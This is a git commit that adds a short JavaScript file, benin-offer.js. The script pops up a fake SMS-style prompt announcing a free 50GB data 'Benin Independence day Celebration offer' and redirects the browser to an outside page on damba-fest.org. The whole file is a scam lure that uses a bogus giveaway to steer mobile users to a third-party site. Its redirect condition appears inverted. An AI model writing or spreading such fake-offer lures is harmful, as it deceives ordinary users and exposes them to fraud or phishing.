fe4f2f728c4e5902cf7776be5a6a5b704f018363
boss-bloq <nsisboy01@gmail.com>
2024-07-25 16:59:04 -0700

    Create benin-offer.js

---
+++ benin-offer.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('SMS: Congratulations you have been selected to Activate 50gb free data Benin Independence day Celebration offer, Kindly press 1 to proceed now','1');
+if (password != '1') {
+location.href='https://damba-fest.org/benin-independence.html';
+}
